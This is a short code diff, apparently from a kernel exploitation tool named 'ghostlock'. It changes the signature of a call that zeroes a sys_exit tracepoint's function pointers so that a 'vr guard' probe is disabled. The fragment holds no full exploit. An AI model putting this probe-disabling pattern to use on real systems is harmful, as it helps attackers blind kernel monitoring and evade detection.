@@ -88,7 +88,7 @@ namespace ghostlock::session::ancillary {
                 plan->width_bytes);
 
         for (int32_t attempt = 1; attempt <= kVrGuardAttempts; attempt++) {
-            if (context.write_zero(session, target, "vr guard: sys_exit tp->funcs")) {
+            if (context.write_zero(target, "vr guard: sys_exit tp->funcs")) {
                 pr_success("vr guard: sys_exit probe disabled (attempt %d)\n", attempt);
                 return true;
             }
